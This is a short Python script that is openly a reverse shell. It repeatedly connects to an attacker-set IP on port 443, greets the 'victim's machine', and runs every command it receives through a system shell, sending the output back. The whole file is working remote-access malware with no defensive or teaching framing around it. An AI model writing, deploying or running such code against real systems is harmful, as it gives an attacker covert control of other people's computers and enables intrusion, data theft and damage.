import socket
import subprocess
import os

IP = "192.x.x.x"    # Change this to your Linux IP
PORT = 443          # Make sure this port is open on your Linux

def connect():
    """Creates a persistent connection to the attacker's machine."""
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((IP, PORT))
            client.send("Welcome to your victim's machine!\n─$ ".encode())  # Initial prompt
            shell(client)
        except Exception:
            client.close()
            continue  # Retry connection

def shell(client):
    """Keeps the shell open to receive commands."""
    while True:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                client.send("─$ ".encode())  # Send prompt again if empty command
                continue
            elif data.lower() == "/exit":
                client.close()
                exit()
            else:
                execute_command(client, data)
        except Exception:
            break  # If an error occurs, close connection and retry

def execute_command(client, command):
    """Executes a command and sends the output back to the attacker."""
    try:
        if command.lower().startswith("cd "):
            path = command[3:].strip()
            os.chdir(path)
            response = f"Changed directory to {os.getcwd()}\n"
        elif command.lower() == "ls":
            response = "\n".join(os.listdir()) + "\n"
        elif command.lower() == "pwd":
            response = os.getcwd() + "\n"
        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output, error = proc.communicate()
            response = output.decode() + error.decode()

        # Send response + fixed prompt
        client.send((response + "─$ ").encode())

    except Exception as e:
        client.send(f"Error executing command: {e}\n─$ ".encode())


if __name__ == "__main__":
    connect()
